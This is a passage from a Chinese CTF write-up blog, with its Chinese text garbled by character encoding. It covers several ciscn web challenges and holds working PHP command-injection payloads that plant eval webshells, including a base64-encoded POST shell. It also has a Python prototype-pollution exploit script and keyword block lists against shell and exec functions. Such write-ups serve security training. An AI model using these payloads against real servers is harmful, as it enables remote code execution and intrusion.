name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¯ä»¥ç”¨å•å¼•å·åµŒå¥—åå¼•å·æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=GWHT.php&amp;count=&#x27;`ls &gt; 1.txt`&#x27;</span><br></pre></td></tr></table></figure>

<p>å‰æçŸ¥è¯†ï¼š</p>
<p>å› ä¸ºè¿‡æ»¤äº†<code>$_POST</code>å’Œ<code>$_GET</code>ï¼Œéœ€è¦å¯ä»¥ç”¨åˆ°<code>get_defined_vars()</code>ã€‚</p>
<p>æ‰“å°ä¸€ä¸ª<code>get_defined_vars()</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;pass&quot;]=&gt; string(4) &quot;PASS&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€å¤–å±‚æ˜¯ä¸€ä¸ª<code>array</code>ï¼Œ<code>array</code>çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯<code>_GET</code>ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‡½æ•°å¤–å±‚åµŒå¥—ä¸¤å±‚poså°±å¯ä»¥è·å–åˆ°<code>_GET</code>çš„å€¼äº†ï¼Œä¸‹é¢å°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(pos(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†å†™ä¸€ä¸ª<code>post</code>çš„ğŸ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10021/1.php?a=file_put_contents(&#x27;kkk.php&#x27;, base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;));</span><br></pre></td></tr></table></figure>

<p>åˆæˆ–è€…ç”¨<code>next</code>å¯ä»¥ç›´æ¥è¿æ¥èšå‰‘</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(next(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">ciscnåˆèµ›</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-08-22 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-22T00:00:00+08:00">2020-08-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:36:24" itemprop="dateModified" datetime="2020-10-16T11:36:24+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h2><p>ä¸€æ¬¡èººèµ¢çš„æ¯”èµ›</p>
<p>ä¸€é˜Ÿwp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">ä¼ é€é—¨</a></p>
<p>y1ngå¸ˆå‚…wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">ä¼ é€é—¨</a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">   $pid = pcntl_fork();</span><br><span class="line">   <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="comment">// åˆ›å»ºå­è¿›ç¨‹é”™è¯¯ï¼Œè¿”å›-1</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹ä¼šå¾—åˆ°å­è¿›ç¨‹å·ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span></span><br><span class="line">       $r=pcntl_wait($status);</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹å¿…é¡»ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºåï¼Œå†åˆ›å»ºä¸‹ä¸€ä¸ªå­è¿›ç¨‹ã€‚</span></span><br><span class="line">       <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;<span class="comment">//æ£€æŸ¥çŠ¶æ€ä»£ç æ˜¯å¦ä»£è¡¨ä¸€ä¸ªæ­£å¸¸çš„é€€å‡ºã€‚</span></span><br><span class="line">           <span class="comment">//è¿”å›å€¼å½“å­è¿›ç¨‹çŠ¶æ€ä»£ç ä»£è¡¨æ­£å¸¸é€€å‡ºæ—¶è¿”å› TRUE ,å…¶ä»–æƒ…å†µè¿”å› FALSEã€‚</span></span><br><span class="line">           phpinfo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">           call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">       <span class="comment">//å‘å½“å‰è¿›ç¨‹å‘é€SIGUSR1ä¿¡å·</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯æƒ³è¿›å…¥<code>phpinfo</code>è¿™é‡Œå­å¥é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯è¦è®©<code>pcntl_wifexited($status)</code>ä¸ºFALSE</p>
<p>å¯ä»¥ç»™aä¼ <code>fsockopen</code>é€ æˆå¼‚æ­¥ï¼Œä½¿å¾—å½“å‰çº¿ç¨‹é€€å‡ºï¼Œçˆ¶çº¿ç¨‹å°±è¿è¡Œäº†<code>phpinfo</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjibnmrjlx4.cloudeci1.ichunqiu.com/?a=fsockopen&amp;b=1</span><br></pre></td></tr></table></figure>

<p>åœ¨phpinfoé¡µé¢å‘ç°flagã€‚</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h2><p>ç»™äº†æºç é™„ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è·¯ç”±<code>/DeveloperControlPanel</code>å¦‚æœ<code>Admin[key] === password</code>å°±ä¼šè¾“å‡º<code>flag</code>ï¼Œç„¶å</p>
<p>è·¯ç”±<code>/Privilege</code>å…ˆæ£€æŸ¥<code>req.session.knight </code>ï¼Œ<code>req.body.NewAttributeKey</code>ï¼Œ<code>req.body.NewAttributeValue</code>æ˜¯å¦æœªå®šä¹‰ï¼Œå½“ç„¶è¿™é‡Œçš„<code>key</code>å’Œ<code>value</code>éƒ½æ˜¯å¯æ§çš„ï¼Œç„¶åä¸‹é¢æœ‰ä¸ªå…³é”®ç‚¹å°±æ˜¯<code>setFn(req.session.knight, key, value);</code>è¿™é‡Œ<code>setFn</code>ç”¨äº†<code>require(&#39;set-value&#39;);</code>è¿™ä¸ªæ¨¡å—ã€‚ä¹Ÿå°±æ˜¯å¾€<code>req.session.knight</code>æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚</p>
<p>è¿™é‡Œæƒ³åˆ°ç”¨åŸå‹é“¾æ±¡æŸ“ï¼Œè¿›è¡Œæ±¡æŸ“å¯¹è±¡åŸå‹ï¼Œä»è€Œå¯ä»¥ä¿®æ”¹Adminçš„keyå’Œpasswordã€‚</p>
<p>å…ˆè®¿é—®<code>/SpawnPoint</code>ç”Ÿæˆ<code>session</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>ze9505q64pi62k5m16h.cloudeci1.ichunqiu.com:<span class="number">8888</span>/SpawnPoint</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>Privilege</code>è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå†åœ¨<code>/DeveloperControlPanel</code>è¾“å…¥å€¼å³å¯è·å–flagã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;__jsluid_h=b34fa3669aa578dc0618e3f9aa1c3a45; session=s:zvjsKzwgmvmxjeoGEWv8F5SimfB6LlQD.YrK/DLOjKSGHC2HJpOHGiV/cmaurt2/fpbrwMle3nLM&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/Privilege&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;NewAttributeKey&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;NewAttributeValue&quot;</span>:<span class="string">&#x27;__proto__.[abcd]&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€&#x27;</span>.$val.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€&#x27;</span>.$ifstr.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ 